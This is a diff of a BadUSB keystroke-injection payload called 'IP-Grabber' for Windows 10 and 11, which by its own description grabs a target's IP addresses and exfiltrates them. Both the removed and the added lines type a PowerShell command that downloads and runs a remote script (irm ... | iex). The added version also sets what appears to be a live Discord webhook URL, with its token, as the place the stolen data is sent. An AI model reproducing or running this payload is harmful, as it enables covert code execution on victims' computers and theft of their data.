@@ -1,12 +1,13 @@
 REM     Title: IP-Grabber
 
-REM     Author: I am Jakoby
-
 REM     Description: This payload is meant to do grab your targets IP addresses and exfil them
 
 REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/f0x | iex
+STRING powershell
+ENTER
+DELAY 2000
+STRING $dc='https://discord.com/api/webhooks/1242159342833373286/3WtgzwdqLpzzQjyYG_LLs5uy3OGJm60LQm706gxOy4z9Et8JlAZFe2yztn-IlVs7pqxJ';$db='';irm https://raw.githubusercontent.com/fabiocaspani/Flipper-Zero-Stuff/main/BadUSB/Win_Get_IP/IP-Grabber.ps1 | iex
 ENTER
